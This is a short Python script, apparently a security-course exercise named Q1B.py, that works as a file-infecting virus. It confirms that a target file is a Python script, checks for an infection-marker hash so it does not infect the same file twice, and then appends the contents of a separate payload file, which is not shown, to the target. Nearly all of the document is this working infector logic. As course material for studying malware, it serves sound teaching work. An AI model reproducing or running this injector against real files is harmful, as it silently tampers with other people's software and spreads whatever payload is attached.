import sys

def is_infected(target_file):
    id = "# 56858c6a52df13e2ae9f3a7cd02bc623c4b42d3670960249a6d50ebe4c5b9d7d"
    with open(target_file, "r") as target:
        for row in target:
            if row.strip() == id:
                return True     
    return False
    
def is_script(file):
    required_statement = 'if __name__ == "__main__":'
    with open(file, "r") as file:
        for row in file:
            if row.strip() == required_statement:
                return True
    return False

def verify(target_file):
    is_python_script = False

    if not is_script(target_file):
        print("Could not verify file is python script; no {required_statement} statement.")
        return 0
    try:
        if is_infected(target_file):
            print("File is already infected.")
            return 0
    except: 
        return 1 

    return 1

def inject(target_file, payload_file):
    with open(target_file, "a+") as target:
        target.write("\n")
        with open(payload_file, "r") as payload:
            target.write(payload.read())  

              
    

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 Q1B.py [target_file]\n")
        return 1
    
    target_file = sys.argv[1]

    is_verified = verify(target_file)
    if not is_verified:
        print("Verification failed\nQuitting...")
        return 1


    payload_file = "Q1B_payload.py"
    inject(target_file, payload_file)
    

    return 0
    
main()